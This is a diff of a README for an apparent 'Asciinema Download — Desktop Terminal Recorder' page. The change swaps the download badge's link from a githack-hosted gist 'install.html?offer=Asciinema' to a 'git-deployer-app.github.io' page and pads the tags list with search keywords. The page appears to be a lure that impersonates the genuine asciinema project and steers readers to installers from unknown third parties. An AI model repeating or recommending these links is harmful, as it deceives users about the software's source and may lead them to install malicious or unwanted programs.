@@ -1,6 +1,6 @@
 # Asciinema Download — Desktop Terminal Recorder
 
-[![Get Asciinema GitHub](https://img.shields.io/badge/Get%20Asciinema%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/shobswear1974/1c03bf7b26ac2513749034c3cd8e9757/raw/fc38a749ef05575550132c8a1d47861e5918d7f3/install.html?offer=Asciinema)
+[![Get Asciinema GitHub](https://img.shields.io/badge/Get%20Asciinema%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-deployer-app.github.io/.github/?offer=Asciinema)
 
 ---
 
@@ -70,7 +70,7 @@ It supports exporting to multiple formats and integrates seamlessly with documen
 ---
 
 ## 🔍 Tags
-asciinema app, cross-platform terminal recorder, interactive terminal recordings Windows Mac, command-line recording software, developer tool desktop, desktop dev workflow, asciinema mac, asciinema pc, asciinema windows, asciinema desktop, asciinema for mac, asciinema for pc, asciinema for windows
+asciinema app, asciinema github, asciinema, asciinema to mp4, cross-platform terminal recorder, interactive terminal recordings Windows Mac, command-line recording software, developer tool desktop, desktop dev workflow, asciinema mac, asciinema pc, asciinema windows, asciinema desktop, asciinema for mac, asciinema for pc, asciinema for windows
 
 ---
 
